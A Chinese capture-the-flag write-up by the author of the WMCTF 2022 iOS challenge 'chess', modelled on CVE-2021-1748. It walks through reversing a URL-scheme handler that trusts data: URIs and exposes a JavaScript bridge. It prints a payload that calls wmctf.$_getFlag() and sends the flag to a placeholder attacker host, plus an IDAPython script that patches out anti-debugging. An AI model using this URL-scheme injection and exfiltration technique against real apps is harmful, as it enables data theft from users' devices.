---
title: WMCTF 2022 挑战赛 chess writeup
publish_date: 2022-02-22
---

### 写在前面

有幸受邀给 WMCTF 2022 出一道客户端的赛题。而传统的客户端 CTF 一般无论是以游戏的形式展示或者单纯一个输入框，都是客户端内置了一个算法，需要选手去逆向这个算法来拿到 flag。受到 Real World CTF 2019 中 [DezhouInstrumenz](https://github.com/ChiChou/DezhouInstrumenz) 的启发，决定出一个贴近真实环境的，真正能给选手挖洞提供思路参考的题目。于是就有了这道参考**著名白帽黑客 CodeColorist 的 CVE-2021-1748 来出的一道题目**（由于该 CVE 影响范围较广且具有比较严重的危害，所以题目进行了一定的魔改）。

### 解题过程

首先拿到 IPA 解压缩之后发现在 Bundle 中存在一个名为 flag 文件，文件内容为 {placeholder}。且根据赛题得知有一台真实 iPhone 在后端运行，则可知存在真正的 flag 的 App 正运行在该 iPhone 当中。

查看 Bundle 中的 Info.plist 文件可发现应用注册一个 URL Scheme，为 `chess://`：

![6303269930df1](../wmctf_2022_chess_writeup/6303269930df1.png)

将二进制扔到 IDA 进行分析，查看应用 URL Scheme 的关键回调逻辑：

![image.png](../wmctf_2022_chess_writeup/630339a0499fe.png)

继续跟进 `_showExternalURL`：

![image.png](../wmctf_2022_chess_writeup/630339df7bb9e.png)

代码中存在两处内联汇编的反调试逻辑，选手可以通过静态匹配特征来 patch：

![image.png](../wmctf_2022_chess_writeup/63033a628fe0e.png)

在 `showExternalURL` 函数中遇到第一个判断：

![image.png](../wmctf_2022_chess_writeup/63033b492377b.png)

通过动态调试跟进函数看下判断的逻辑：

![image.png](../wmctf_2022_chess_writeup/Xnip2022-08-22_16-20-07.png)

该部分代码大意为：如果 URL 的参数中存在 urlType=exit 或者 search 或者 web 时则返回 true。

当判断返回 true 时则跳进第一个分支 `_legacyResolveExternalURL` 函数中：

![image.png](../wmctf_2022_chess_writeup/63033d22e1f7d.png)

继续跟进 `resolveURL` 函数中：

![Xnip20220822_162741.png](../wmctf_2022_chess_writeup/Xnip2022-08-22_16-27-41.png)

在 `_showAccountViewControllerWithURL` 函数中会先取传入 URL 中的 url 参数字段，并弹出新的控制器进行加载：

![image.png](../wmctf_2022_chess_writeup/63033ef006333.png)

我们可以看到新弹出的控制器是用`UIHostingController` 包装的 `ContentWebView`。

在 SwiftUI 中如何实现一个 WebView 参考链接：https://www.appcoda.com/swiftui-wkwebview/

寻找 `makeUIView` 函数来看下应用是如何处理构造 URLRequest 的，关键代码：

![image.png](../wmctf_2022_chess_writeup/630340ae598cc.png)

先调用了 `_URLByRemovingBlacklistedParametersWithURL` 函数，在该函数中进行了一些特殊符号的过滤，并且在 URL 的结尾添加了一个 `?` 符号。

接下来调用 `urlIsTrusted` 进行了一次判断：

![image.png](../wmctf_2022_chess_writeup/63034fae242c0.png)

在该函数中存在一段逻辑，当传入的 URL 的 Scheme 为 data 时，则返回  true。也就是说当传入 URL 是个 Data URi 时则认为该 URL 是个可信的 URL。

当传入的 URL 是一个可信 URL 时，则调用 `injectScriptInterface` ，并且加载 URL：

![image.png](../wmctf_2022_chess_writeup/630350565b093.png)

让我们跟进 `injectScriptInterface` 看下关键逻辑：

![Xnip20220822_175321.png](../wmctf_2022_chess_writeup/Xnip2022-08-22_17-53-21.png)

可以看到将 `WMScriptInterface` 类的方法导出到 js 上下文中，这些 API 被放在全局作用域的 `wmctf` 命名空间里。

然后我们在 IDA 中搜索，惊喜的发现有个 `-[chess.WMScriptInterface _getFlag]` 的函数：

![image.png](../wmctf_2022_chess_writeup/630352619b9c1.png)

此时我们得知可以一个构造 payload 然后通过 URL Scheme 调起 chess 客户端，并执行 `wmctf.$_getFlag()` 来获取到 flag。

构造生成 Payload 的 js 代码：

```javascript
String.prototype.toDataURI = function() {
  return 'data:text/html;,' + encodeURIComponent(this).replace(/[!'()*]/g, escape);
}

function payload() {  
  var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://XXX/test?flag=' + wmctf.$_getFlag(), false); xhr.send();
}

const data = `<script type="application/javascript">(${payload})()<\/script>`.toDataURI()
const url = new URL('chess://x?urlType=web');

url.searchParams.set('url', data);
url.toString()
```

只要将该 URL Scheme 提交（我写了个 webserver，用来接收 payload 并在设备执行），则会在设备执行，并且将 flag 发送到攻击者的服务器。

IDAPython Ptach `svc 0x80`:

``` python
import idc
def text_seg_addr_start():
    for seg in Segments():
        if SegName(seg) == '__text':
            addr = hex(SegStart(seg))
            print("text segment address start: " + addr)
            return int(addr[0:-1], 16)
def text_seg_addr_end():
    for seg in Segments():
        if SegName(seg) == '__text':
            addr = hex(SegEnd(seg))
            print("text segment address end: " + addr)
            return int(addr[0:-1], 16)       
start = text_seg_addr_start()
end = text_seg_addr_end()
while start < end:
    m = idc.print_insn_mnem(start)
    n = idc.print_operand(start, 0)
    if m == 'SVC' and n == '0x80':
        # print(idc.GetDisasm(start))
        if idc.print_operand(idc.prev_head(start), 1) == '#0x1A':
            idc.PatchDword(start, 0xD503201F)
            print("patch {} success!".format(hex(start)))
    start += 4
```

### 彩蛋：

当用 js 调用 wmctf 命名空间中一个不存在的方法时，则会返回一段 base64 编码的图片字符串！

### 参考资料

https://codecolor.ist/2021/08/04/mistuned-part-i/
https://developer.apple.com/documentation/objectivec/nsobject/webscripting?language=objc
https://developer.apple.com/documentation/objectivec/nsobject/1528539-webscriptname/
https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/SafariJSProgTopics/ObjCFromJavaScript.html